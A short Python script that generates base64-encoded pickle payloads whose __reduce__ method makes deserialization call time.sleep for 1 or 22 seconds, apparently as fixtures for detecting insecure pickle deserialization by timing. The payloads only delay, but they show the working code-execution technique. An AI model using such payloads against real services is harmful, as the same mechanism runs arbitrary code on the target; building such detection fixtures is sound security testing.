import base64
import pickle
import time


class DelayUsingSleep1:
    def __reduce__(self):
        return time.sleep, (1,)


class DelayUsingSleep22:
    def __reduce__(self):
        return time.sleep, (22,)


dump = pickle.dumps(DelayUsingSleep1())
payload = base64.b64encode(dump).decode("ascii")

print(f'Save this to pickle.json "1": {payload}')

dump = pickle.dumps(DelayUsingSleep22())
payload = base64.b64encode(dump).decode("ascii")

print(f'Save this to pickle.json "2": {payload}')

print("Manually check the offsets of the 1 and 22 strings and save them to pickle.json")
